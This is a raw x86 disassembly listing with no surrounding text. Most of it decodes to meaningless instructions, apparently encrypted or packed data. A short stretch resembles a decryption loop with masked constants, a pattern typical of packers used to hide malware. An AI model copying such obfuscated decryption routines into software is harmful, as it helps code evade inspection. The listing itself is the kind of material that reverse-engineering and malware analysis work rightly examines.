  40593a:	xchg   edx,eax
  40593b:	inc    eax
  40593c:	xchg   edi,eax
  40593d:	cmp    edi,0x693078b
  405943:	loopne 0x40592e
  405945:	fcom   DWORD PTR ds:0xeefe0441
  40594b:	loopne 0x405910
  40594d:	push   esi
  40594e:	mov    al,ds:0x4fa68880
  405953:	dec    ebp
  405954:	inc    edi
  405955:	xor    ch,BYTE PTR [ecx]
  405957:	sbb    DWORD PTR cs:[ecx],eax
  40595a:	adc    eax,0x86709cd1
  40595f:	mov    edx,0x2107c11
  405964:	mov    ds:0x39a89e5c,eax
  405969:	cs popa 
  40596b:	sub    dl,BYTE PTR [esi-0x8]
  40596e:	cmp    DWORD PTR [eax+0x67],ebp
  405971:	inc    edx
  405972:	sub    eax,0xbd40e737
  405977:	xchg   ecx,eax
  405978:	pusha  
  405979:	push   0x6577bffa
  40597e:	mov    ah,0x1
  405980:	jno    0x405920
  405982:	cmp    dh,BYTE PTR [eax+0x2f]
  405985:	mov    esp,0x50adae76
  40598a:	or     BYTE PTR [eax-0xe43211a],ah
  405990:	cmp    bl,ch
  405992:	push   ebx
  405993:	mov    ch,0x7a
  405995:	dec    ebx
  405996:	dec    eax
  405997:	xchg   DWORD PTR [ecx+0x485f891f],ecx
  40599d:	sahf   
  40599e:	stos   BYTE PTR es:[edi],al
  40599f:	pop    ebx
  4059a0:	jmp    0x108e8312
  4059a5:	pop    es
  4059a6:	icebp  
  4059a7:	cmp    eax,0x8bd93034
  4059ac:	dec    ebp
  4059ad:	cmp    BYTE PTR gs:[ebx-0xd843e41],ah
  4059b4:	icebp  
  4059b5:	mov    ecx,0xec980193
  4059ba:	or     DWORD PTR [ebp-0x3a],edx
  4059bd:	mov    esi,0x9e2135d5
  4059c2:	jnp    0x405995
  4059c4:	outs   dx,BYTE PTR ds:[esi]
  4059c5:	xchg   ebx,eax
  4059c6:	in     al,dx
  4059c7:	ror    DWORD PTR ds:0x6acb1e6c,cl
  4059cd:	pop    edx
  4059ce:	das    
  4059cf:	test   eax,0x51956443
  4059d4:	adc    ebp,esp
  4059d6:	push   ecx
  4059d7:	push   ebp
  4059d8:	cwde   
  4059d9:	cmp    BYTE PTR [eax-0x493da658],bl
  4059df:	mov    edx,0x3465a085
  4059e4:	xor    ebp,DWORD PTR [esi-0x5b91418b]
  4059ea:	jg     0x405992
  4059ec:	add    edi,edx
  4059ee:	jmp    0x405a65
  4059f0:	imul   ebx,DWORD PTR [eax-0x3a],0x274a3cfa
  4059f7:	out    dx,eax
  4059f8:	or     bl,BYTE PTR [edx-0x2a]
  4059fb:	xchg   ebx,eax
  4059fc:	adc    dl,BYTE PTR [ecx+0x27]
  4059ff:	cmc    
  405a00:	sub    dh,0xd1
  405a03:	ror    DWORD PTR [ebp-0x663e374c],1
  405a09:	mov    ds:0xef422e8d,al
  405a0e:	rcr    ah,0x9c
  405a11:	test   eax,0x4db67f7
  405a16:	lock popa 
  405a18:	push   ss
  405a19:	pop    ebx
  405a1a:	push   ebp
  405a1b:	fcmovnb st,st(3)
  405a1d:	mov    dh,0x14
  405a1f:	gs ds lods al,BYTE PTR es:[esi]
  405a23:	je     0x405aa1
  405a25:	dec    esi
  405a26:	dec    esi
  405a27:	dec    esi
  405a28:	or     cl,BYTE PTR ds:0x616e545f
  405a2e:	mov    ebx,0x2da449e2
  405a33:	xlat   BYTE PTR ds:[ebx]
  405a34:	(bad)  
  405a35:	test   al,0xc1
  405a37:	adc    esi,0xc7701c80
  405a3d:	lds    ebx,FWORD PTR [ebp-0x68]
  405a40:	mov    dl,0x25
  405a42:	loope  0x405ab7
  405a44:	sbb    BYTE PTR [ebx+0x70dac524],0x21
  405a4b:	dec    edi
  405a4c:	mov    edx,0xa3c6808d
  405a51:	add    bl,BYTE PTR [esi+0x7d]
  405a54:	cmp    ecx,ebx
  405a56:	fcomp  QWORD PTR ds:0xed09c4f8
  405a5c:	mov    ebx,0xaaffc46e
  405a61:	sbb    DWORD PTR [edi+0x19],ebp
  405a64:	arpl   sp,di
  405a66:	sub    cl,BYTE PTR [edi+0x1809d2fd]
  405a6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a6d:	bound  edx,QWORD PTR [ecx+0x28888590]
  405a73:	jnp    0x405a3a
  405a75:	pop    edx
  405a76:	fs (bad) 
  405a78:	int    0x7
  405a7a:	in     eax,0x3b
  405a7c:	inc    edi
  405a7d:	dec    edi
  405a7e:	mov    al,ds:0xe6d88625
  405a83:	pop    esi
  405a84:	adc    dl,dl
  405a86:	and    ecx,DWORD PTR [ebp-0x50]
  405a89:	mov    bl,0x84
  405a8b:	cmc    
  405a8c:	inc    esi
  405a8d:	imul   esi,ebx,0x6090c060
  405a93:	sahf   
  405a94:	aad    0x40
  405a96:	xchg   esi,eax
  405a97:	mov    dh,0x1f
  405a99:	and    edi,ebx
  405a9b:	daa    
  405a9c:	std    
  405a9d:	dec    eax
  405a9e:	sti    
  405a9f:	xchg   esi,eax
  405aa0:	xchg   ebx,eax
  405aa1:	or     al,0xfe
  405aa3:	retf   0xdd32
  405aa6:	out    0x9f,al
  405aa8:	cmp    esp,DWORD PTR [edi]
  405aaa:	and    al,ch
  405aac:	fsub   QWORD PTR [ebp+eiz*1+0x33f51ab8]
  405ab3:	mov    dl,0xd9
  405ab5:	hlt    
  405ab6:	jae    0x405a43
  405ab8:	popa   
  405ab9:	cli    
  405aba:	mov    al,0x29
  405abc:	push   es
  405abd:	scas   al,BYTE PTR es:[edi]
  405abe:	cmp    eax,0xf8afcfb2
  405ac3:	imul   eax,DWORD PTR [edi-0x1c6372fc],0xffffffa0
  405aca:	ficom  DWORD PTR [esi+0x12]
  405acd:	xchg   DWORD PTR [edi],edx
  405acf:	xor    al,0x76
  405ad1:	dec    DWORD PTR [ecx+0x7ffe48a2]
  405ad7:	shr    DWORD PTR [edx+0x2],0xa0
  405adb:	add    DWORD PTR [edi],0xffffff9b
  405ade:	(bad)  
  405adf:	stos   BYTE PTR es:[edi],al
  405ae0:	outs   dx,BYTE PTR ds:[esi]
  405ae1:	cmp    eax,0xb9bd1a9e
  405ae6:	je     0x405b20
  405ae8:	inc    esp
  405ae9:	sub    esp,DWORD PTR [eax]
  405aeb:	fidiv  WORD PTR [edx+0xf]
  405aee:	rcr    DWORD PTR [edi+eiz*2],cl
  405af1:	push   ss
  405af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405af3:	mov    esp,0xf24ba706
  405af8:	lock (bad) [ecx]
  405afb:	inc    BYTE PTR [ebp+eax*2-0x4a4776ee]
  405b02:	dec    esi
  405b03:	jae    0x405b71
  405b05:	xchg   ebp,eax
  405b06:	pop    ecx
  405b07:	int3   
  405b08:	dec    eax
  405b09:	sahf   
  405b0a:	cli    
  405b0b:	inc    eax
  405b0c:	js     0x405b34
  405b0e:	fnstsw WORD PTR [edx+edx*2-0x786d9c23]
  405b15:	les    ecx,FWORD PTR [edx-0x3f8b85ec]
  405b1b:	das    
  405b1c:	mov    ch,0xe
  405b1e:	enter  0xe805,0x89
  405b22:	retf   0x8d13
  405b25:	mov    BYTE PTR [esi-0x5fca1cfb],ah
  405b2b:	enter  0x7c03,0xc4
  405b2f:	es mov bl,0xa9
  405b32:	sub    eax,0xd8bf1746
  405b37:	rcl    al,0x95
  405b3a:	pusha  
  405b3b:	std    
  405b3c:	mov    ah,0x95
  405b3e:	mov    eax,0x167704f7
  405b43:	dec    esp
  405b44:	ret    0x3756
  405b47:	pop    ecx
  405b48:	leave  
  405b49:	aad    0x38
  405b4b:	outs   dx,DWORD PTR ds:[esi]
  405b4c:	outs   dx,BYTE PTR ds:[esi]
  405b4d:	push   esi
  405b4e:	ins    BYTE PTR es:[edi],dx
  405b4f:	sahf   
  405b50:	mov    ds:0xc2272904,eax
  405b55:	pop    ds
  405b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b57:	jo     0x405bd8
  405b59:	mov    dl,0x3
  405b5b:	dec    ebp
  405b5c:	aam    0xd4
  405b5e:	dec    ebp
  405b5f:	dec    ebx
  405b60:	and    eax,0xfa559d65
  405b65:	sbb    bh,BYTE PTR [ecx]
  405b67:	rcr    DWORD PTR [edi+0x69],0x1f
  405b6b:	daa    
  405b6c:	sahf   
  405b6d:	sub    al,0x92
  405b6f:	ror    BYTE PTR [edi+0x5f206be9],1
  405b75:	hlt    
  405b76:	inc    esp
  405b77:	dec    ebp
  405b78:	test   al,0xf1
  405b7a:	xlat   BYTE PTR ds:[ebx]
  405b7b:	add    cl,BYTE PTR [esi-0x757d0f5b]
  405b81:	push   es
  405b82:	sbb    al,0x59
  405b84:	cmp    DWORD PTR [eax+ecx*8-0x65ee387e],edi
  405b8b:	pop    es
  405b8c:	xor    bh,BYTE PTR [edx]
  405b8e:	xor    edx,ecx
  405b90:	scas   al,BYTE PTR es:[edi]
  405b91:	pop    ss
  405b92:	inc    edi
  405b93:	or     bh,BYTE PTR [eax+0x70]
  405b96:	and    ebx,DWORD PTR [ebx]
  405b98:	into   
  405b99:	lds    ebp,FWORD PTR [edx-0xb596a8]
  405b9f:	test   DWORD PTR [ecx],ecx
  405ba1:	sub    BYTE PTR [esi+0x30413f17],dh
  405ba7:	lods   al,BYTE PTR ds:[esi]
  405ba8:	sbb    edx,DWORD PTR [ebx+0x21]
  405bab:	(bad)  [esi]
  405bad:	repnz into 
  405baf:	dec    edi
  405bb0:	xchg   edi,eax
  405bb1:	push   0xfd5843f1
  405bb6:	in     al,dx
  405bb7:	add    al,0xd8
  405bb9:	mov    ah,0xa0
  405bbb:	sbb    bh,BYTE PTR [edi-0x5932099f]
  405bc1:	add    eax,0xbf38ceb1
  405bc6:	mov    ebx,0xa1a05c0d
  405bcb:	dec    edi
  405bcc:	mov    ecx,0x3262b1ec
  405bd1:	add    ax,0x882b
  405bd5:	inc    edx
  405bd6:	xor    al,0xbb
  405bd8:	xor    BYTE PTR [ebx+0x1207b8b7],0xcb
  405bdf:	idiv   BYTE PTR [ebx+0x3fe8a6e4]
  405be5:	pop    ss
  405be6:	push   esi
  405be8:	call   0x8866207c
  405bed:	or     al,0x62
  405bef:	ds aas 
  405bf1:	ret    0xcdae
  405bf4:	in     eax,0x4d
  405bf6:	repnz xchg edx,eax
  405bf8:	xchg   DWORD PTR [ebx-0x3c],edi
  405bfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bfc:	jae    0x405c6c
  405bfe:	data16 cmp al,0x44
  405c01:	bound  edx,QWORD PTR [eax]
  405c03:	ret    
  405c04:	xlat   BYTE PTR ds:[ebx]
  405c05:	mov    dl,0xfc
  405c07:	iret   
  405c08:	sub    BYTE PTR [ebp-0x7a],ch
  405c0b:	pusha  
  405c0c:	repz pop ebx
  405c0e:	outs   dx,DWORD PTR ds:[esi]
  405c0f:	(bad)
  405c12:	xchg   ecx,eax
  405c13:	frstpm(287 only) 
  405c15:	inc    esp
  405c16:	enter  0xba3c,0xe0
  405c1a:	iret   
  405c1b:	(bad)  
  405c1c:	fild   WORD PTR [esi]
  405c1e:	or     esi,DWORD PTR [ecx]
  405c20:	add    al,0xc6
  405c22:	loop   0x405c6d
  405c24:	cmc    
  405c25:	lock sbb al,0x8a
  405c28:	add    esi,DWORD PTR [eax-0x6f3335e2]
  405c2e:	mov    ebp,0x5f66392c
  405c33:	fsub   DWORD PTR ds:0x15b02366
  405c39:	loopne 0x405c70
  405c3b:	shr    DWORD PTR [eax-0x139a27a4],cl
  405c41:	jecxz  0x405c18
  405c43:	push   cs
  405c44:	aaa    
  405c45:	nop
  405c46:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  405c48:	fdivrp st(1),st
  405c4a:	pop    ds
  405c4b:	mov    al,0x7c
  405c4d:	(bad)  
  405c4e:	sub    al,0x8a
  405c50:	dec    eax
  405c51:	xchg   edi,eax
  405c52:	mov    ebx,0x1d55e5eb
  405c57:	and    eax,DWORD PTR [ebp-0x13174335]
  405c5d:	mov    BYTE PTR [esi-0x7814826f],dl
  405c63:	fmul   QWORD PTR [bp+si]
  405c66:	cmp    eax,0xe65359c6
  405c6b:	jae    0x405c4b
  405c6d:	neg    DWORD PTR [ecx-0xe]
  405c70:	repz cmp BYTE PTR [esi+0x36],0xc8
  405c75:	sbb    BYTE PTR [ecx],dl
  405c77:	add    ch,bh
  405c79:	adc    BYTE PTR [ecx-0x6a],al
  405c7c:	pop    ebx
  405c7d:	in     al,dx
  405c7e:	dec    ebp
  405c7f:	ds dec ebx
  405c81:	sub    eax,0x5afd4bac
  405c86:	xchg   edi,eax
  405c87:	fnsave [ecx+0x9]
  405c8a:	and    DWORD PTR [ebp-0x34deb45d],esp
  405c90:	adc    BYTE PTR [eax+0x49f39fdf],ah
  405c96:	and    eax,0xd9b5e0d7
  405c9b:	adc    BYTE PTR ds:0xa73d10aa,0xc2
  405ca2:	jmp    DWORD PTR [ebp-0x3d]
  405ca5:	mov    ds:0x983b240b,eax
  405caa:	imul   eax,DWORD PTR [ebp+eiz*4+0x14],0x39
  405caf:	jb     0x405cba
  405cb1:	push   eax
  405cb2:	in     eax,0x1a
  405cb4:	push   edx
  405cb5:	leave  
  405cb6:	in     al,dx
  405cb7:	xor    BYTE PTR [ecx],al
  405cb9:	add    al,0x90
  405cbb:	test   eax,0x22bf42c1
  405cc0:	fadd   st,st(7)
  405cc2:	lea    ebp,[edx+0x354c1d13]
  405cc8:	retf   0xf15
  405ccb:	pop    ebx
  405ccc:	int3   
  405ccd:	popa   
  405cce:	jmp    0x25e5:0x835b57e9
  405cd5:	test   DWORD PTR [ebp+0x1f],edi
  405cd8:	cs mov bl,0xb1
  405cdb:	push   ds
  405cdc:	pop    ebp
  405cdd:	lea    edx,[eax+0x4c]
  405ce0:	rol    DWORD PTR [ebx+0x205c2188],1
  405ce6:	push   eax
  405ce7:	sbb    dh,BYTE PTR [edi-0x2]
  405cea:	test   BYTE PTR [ebx+0x449a25ff],0x66
  405cf1:	inc    edi
  405cf2:	jnp    0x405cd9
  405cf4:	sub    DWORD PTR [esi+0x6],ebx
  405cf7:	rcl    DWORD PTR [esi],cl
  405cf9:	(bad)  
  405cfa:	fucomi st,st(5)
  405cfc:	test   DWORD PTR [ebp+0x47],ecx
  405cff:	fisub  DWORD PTR [edx+0x2d837c8b]
  405d05:	push   edx
  405d06:	fmul   QWORD PTR [ebx+0x18]
  405d09:	rol    bh,0xc3
  405d0c:	push   esp
  405d0d:	xchg   edx,eax
  405d0e:	mov    ebx,0xa0dba511
  405d13:	pop    ebp
  405d14:	ins    BYTE PTR es:[edi],dx
  405d15:	popa   
  405d16:	loopne 0x405cc3
  405d18:	add    BYTE PTR [esi+0x34],cl
  405d1b:	jg     0x405d2e
  405d1d:	mov    ch,0x92
  405d1f:	(bad)  
  405d20:	dec    edx
  405d21:	in     eax,0x5e
  405d23:	aam    0xf
  405d25:	mov    bl,0x6d
  405d27:	ins    BYTE PTR es:[edi],dx
  405d28:	loopne 0x405cf1
  405d2a:	jne    0x405cef
  405d2c:	iret   
  405d2d:	retf   
  405d2e:	add    eax,0x423c2a75
  405d33:	ret    
  405d34:	sbb    eax,ebx
  405d36:	xor    ebp,DWORD PTR [ebx+0x2ccebdd3]
  405d3c:	jbe    0x405da7
  405d3e:	mov    cl,0x25
  405d40:	les    eax,FWORD PTR [edi-0x1f]
  405d43:	cmp    ah,BYTE PTR [edi]
  405d45:	fldl2e 
  405d47:	popf   
  405d48:	xchg   ecx,eax
  405d49:	bound  esp,QWORD PTR [ebx+0x53]
  405d4c:	cmp    ebp,eax
  405d4e:	mov    ebx,0x7669c689
  405d53:	idiv   BYTE PTR [ebp+0x35]
  405d56:	pop    ds
  405d57:	dec    edx
  405d58:	(bad)  
  405d59:	cdq    
  405d5a:	addr16 and al,0x30
  405d5d:	lods   al,BYTE PTR ds:[esi]
  405d5e:	pop    ebx
  405d5f:	push   0x5deb9b82
  405d64:	std    
  405d65:	or     ecx,edx
  405d67:	sub    al,BYTE PTR [edi-0x7ad836bf]
  405d6d:	jmp    0x405cf0
  405d6f:	daa    
  405d70:	mov    eax,0x59bbc468
  405d75:	repz dec edi
  405d77:	in     al,0x9c
  405d79:	ret    
  405d7a:	mov    dh,0x8a
  405d7c:	cmp    al,0x6d
  405d7e:	mov    DWORD PTR [edi+0x5923ba01],ebx
  405d84:	arpl   WORD PTR [edi-0x64],cx
  405d87:	and    eax,0x3f2c904
  405d8c:	popa   
  405d8d:	inc    edi
  405d8e:	mov    edi,ecx
  405d90:	mov    bl,0xbd
  405d92:	jmp    0x9d14:0xd2072f8e
  405d99:	retf   0xeeb6
  405d9c:	or     esp,0x14
  405d9f:	push   ss
  405da0:	mov    dh,0x15
  405da2:	call   0xb39eb9df
  405da7:	sbb    dl,dl
  405da9:	out    0x87,eax
  405dab:	xchg   esp,eax
  405dac:	test   al,0x40
  405dae:	mov    dl,0xd1
  405db0:	push   esi
  405db1:	cmc    
  405db2:	mov    ch,al
  405db4:	imul   ecx,DWORD PTR gs:[edx],0x7
  405db8:	jp     0x405d97
  405dba:	xlat   BYTE PTR ds:[ebx]
  405dbb:	xchg   ebp,eax
  405dbc:	cmp    ebx,0xd8040c71
  405dc2:	je     0x405e28
  405dc4:	inc    ecx
  405dc5:	out    0xb0,al
  405dc7:	stos   BYTE PTR es:[edi],al
  405dc8:	push   esp
  405dc9:	call   0xf733:0x685abebd
  405dd0:	mov    cl,BYTE PTR [edi-0x3fef8854]
  405dd6:	ficom  DWORD PTR [eax-0x74]
  405dd9:	ds xchg edi,eax
  405ddb:	popa   
  405ddc:	add    al,0x94
  405dde:	leave  
  405ddf:	test   ecx,edx
  405de1:	push   esp
  405de2:	gs push ecx
  405de4:	sahf   
  405de5:	inc    ecx
  405de6:	mov    ah,0xd7
  405de8:	lods   al,BYTE PTR ds:[esi]
  405de9:	mov    esi,0x222251c
  405dee:	stos   BYTE PTR es:[edi],al
  405def:	inc    ecx
  405df0:	cmp    al,0x38
  405df2:	fsubr  QWORD PTR [ecx]
  405df4:	fsub   DWORD PTR [eax+0x3a]
  405df7:	jne    0x405dbb
  405df9:	push   ss
  405dfa:	scas   eax,DWORD PTR es:[edi]
  405dfb:	mov    edx,0x791423e8
  405e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e01:	adc    BYTE PTR [ebp-0x18ce6d69],dl
  405e07:	inc    esp
  405e08:	lock and eax,0xe5a45b5c
  405e0e:	in     al,dx
  405e0f:	mov    esi,0x7e8026ac
  405e14:	hlt    
  405e15:	jne    0x405e23
  405e17:	in     al,dx
  405e18:	cmc    
  405e19:	push   ebp
  405e1a:	cmp    DWORD PTR [ecx-0x9b441c8],0x0
  405e21:	pop    esi
  405e22:	sahf   
  405e23:	add    DWORD PTR [edi+0x68930936],ecx
  405e29:	stos   DWORD PTR es:[edi],eax
  405e2a:	add    dl,bl
  405e2c:	(bad)  
  405e2d:	xor    eax,0xdef1a2f2
  405e32:	and    eax,0x1e109e1
  405e37:	js     0x405e44
  405e39:	jno    0x405e62
  405e3b:	mov    dh,0x4b
  405e3d:	mov    al,0xd9
  405e3f:	and    BYTE PTR [edi],dl
  405e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e42:	inc    ecx
  405e43:	popa   
  405e44:	jmp    0xca0e3f7d
  405e49:	shl    DWORD PTR [ecx+0x6fcf5e34],cl
  405e4f:	pop    ss
  405e50:	xor    eax,0xfd7ff7f0
  405e55:	push   ds
  405e56:	pop    edi
  405e57:	fsubr  QWORD PTR [esi+0x41c611ce]
  405e5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e5e:	push   0xdae2fa99
  405e63:	cmp    al,0x69
  405e65:	fisubr WORD PTR [ecx-0x2e5bc224]
  405e6b:	mov    ch,0xe7
  405e6d:	call   0x4031:0xd8de5c75
  405e74:	rcl    edi,1
  405e76:	loope  0x405e8b
  405e78:	jp     0x405ee4
  405e7a:	jae    0x405ecd
  405e7c:	nop
  405e7d:	out    0x9f,al
  405e7f:	shr    BYTE PTR [eax-0x2880fea6],0xe3
  405e86:	push   cs
  405e87:	jl     0x405e9c
  405e89:	inc    ebp
  405e8a:	adc    ecx,esi
  405e8c:	popf   
  405e8d:	inc    ebx
  405e8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e8f:	inc    ebp
  405e90:	sbb    al,0x12
  405e92:	jle    0x405ebc
  405e94:	xor    cl,BYTE PTR [edi+0x2b7d010a]
  405e9a:	loop   0x405e9b
  405e9c:	mov    dh,0x66
  405e9e:	mov    ebx,0x33811ead
  405ea3:	mov    ds:0xe4066a3f,al
  405ea8:	push   es
  405ea9:	mov    WORD PTR [ecx],cs
  405eab:	pushw  0x62
  405eae:	mov    ds:0x1cdc795f,al
  405eb3:	add    DWORD PTR [eax],esp
  405eb5:	sbb    DWORD PTR [esi+0x76],0x7633f0df
  405ebc:	mov    ds,WORD PTR [ebp-0x26e56b01]
  405ec2:	mov    al,ds:0x7c9b5fff
  405ec7:	out    dx,al
  405ec8:	scas   eax,DWORD PTR es:[edi]
  405ec9:	xlat   BYTE PTR ds:[ebx]
  405eca:	adc    edi,DWORD PTR [ecx-0x36]
  405ecd:	retf   0xe034
  405ed0:	adc    eax,DWORD PTR ss:0xfd6104c3
  405ed7:	mov    bl,BYTE PTR [ebx-0x542328b7]
  405edd:	dec    eax
  405ede:	xchg   esp,eax
  405edf:	out    dx,eax
  405ee0:	mov    ebp,0x13aacb53
  405ee5:	in     al,0x15
  405ee7:	ss sbb eax,0xd845214b
  405eed:	inc    ebx
  405eee:	push   edx
  405eef:	adc    al,0x5a
  405ef1:	mov    ds:0xfd5a8322,al
  405ef6:	mov    ebx,0xa9d578d3
  405efb:	mov    ebp,0xc9de82ea
  405f00:	data16 or al,0x8f
  405f03:	and    eax,DWORD PTR [ecx+0x56]
  405f06:	sub    ch,BYTE PTR [edx+ebp*2+0x5bb9608]
  405f0d:	jbe    0x405f2a
  405f0f:	leave  
  405f10:	loope  0x405eb3
  405f12:	jb     0x405f52
  405f14:	push   edx
  405f15:	adc    eax,0x2e9c7cc5
  405f1a:	bound  ebp,QWORD PTR [ebx+0x30d5a872]
  405f20:	ret    0xb4be
  405f23:	cmp    ah,bh
  405f25:	or     DWORD PTR [edi-0x7c625672],edi
  405f2b:	jl     0x405f08
  405f2d:	std    
  405f2e:	outs   dx,BYTE PTR fs:[esi]
  405f30:	and    eax,0x93623f57
  405f35:	cs xor dh,bh
  405f38:	popf   
  405f39:	sbb    BYTE PTR [ecx+0x1d8a672e],ch
  405f3f:	push   ds
  405f40:	mov    ecx,0x1791798a
  405f45:	xor    eax,0xd4458974
  405f4a:	mov    eax,DWORD PTR [ebp-0x58]
  405f4d:	sub    eax,ecx
  405f4f:	mov    DWORD PTR [ebp-0x1c],eax
  405f52:	mov    eax,DWORD PTR [ebp-0x1c]
  405f55:	mov    DWORD PTR [ebp-0x14],eax
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	xor    dh,bh
  4060e4:	es scas eax,DWORD PTR es:[edi]
  4060e6:	jno    0x4060a9
  4060e8:	jnp    0x406165
  4060ea:	hlt    
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060ef:	neg    al
  4060f1:	mov    eax,ds:0xdcedc928
  4060f6:	sub    eax,DWORD PTR [eax-0x1c34de69]
  4060fc:	jo     0x4060d9
  4060fe:	popa   
  4060ff:	ss call 0x25c663e7
  406105:	mov    dh,0xa6
  406107:	rol    DWORD PTR fs:[edx],0x18
  40610b:	or     al,ch
  40610d:	cmc    
  40610e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40610f:	mov    al,0xdb
  406111:	dec    ebp
  406112:	loop   0x406122
  406114:	mov    WORD PTR ds:0xadc56d7a,cs
  40611a:	add    BYTE PTR [esi-0x7c],dl
  40611d:	stc    
  40611e:	je     0x40611d
  406120:	aaa    
  406121:	pop    esi
  406122:	mov    ah,bh
  406124:	xchg   edx,eax
  406125:	sub    ah,bl
